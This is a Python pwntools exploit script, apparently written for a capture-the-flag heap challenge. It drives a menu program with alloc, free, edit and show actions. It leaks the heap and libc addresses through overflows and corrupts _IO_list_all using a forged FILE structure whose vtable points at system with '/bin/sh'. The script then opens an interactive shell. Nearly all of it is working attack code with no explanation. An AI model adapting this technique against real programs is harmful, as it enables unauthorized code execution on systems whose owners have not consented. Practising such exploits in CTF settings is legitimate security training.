from pwn import *

# r = remote("csie.ctf.tw", 10146)
r = remote("127.0.0.1", 8888)
context.arch = "amd64"

def alloc(size):
	r.recvuntil("choice:")
	r.sendline("1")
	r.recvuntil("Size:")
	r.sendline(str(size))

def free(idx):
	r.recvuntil("choice:")
	r.sendline("2")
	r.recvuntil("Index:")
	r.sendline(str(idx))

def edit(idx, size, data):
	r.recvuntil("choice:")
	r.sendline("3")
	r.recvuntil("Index:")
	r.sendline(str(idx))
	r.recvuntil("Size:")
	r.sendline(str(size))
	r.recvuntil("Data:")
	r.send(data)

def show(idx):
	r.recvuntil("choice:")
	r.sendline("4")
	r.recvuntil("Index:")
	r.sendline(str(idx))


# leak heap base
r.recvuntil("Name:")
r.send("a" * 0x20)
alloc(0x80)
show(0)
r.recvuntil("a" * 0x20)
heap = u64(r.recvuntil("\n")[:-1].ljust(8, "\x00")) - 0x10
print("heap : " + hex(heap))

# leak libc base
alloc(0x80)
alloc(0x80)
free(1)
edit(0, 0x200, "a" * 0x90)
show(0)
r.recvuntil("a" * 0x90)
libc = u64(r.recvuntil("\n")[:-1].ljust(8, "\x00")) - 0x3c3b78
print("libc : " + hex(libc))

io_list_all = libc + 0x3c4520
fd = 0
bk = io_list_all - 0x10
edit(0, 0x200, "a" * 0x80 + flat(["/bin/sh\x00", 0x61, fd, bk, 0, 1]))
vtable = heap + 0x170
system_off = 0x45390
system = libc + system_off
edit(2, 0x200, "\x00" * 0x38 + p64(vtable) + "b" * 0x18 + p64(system))
alloc(0x80)

r.interactive()

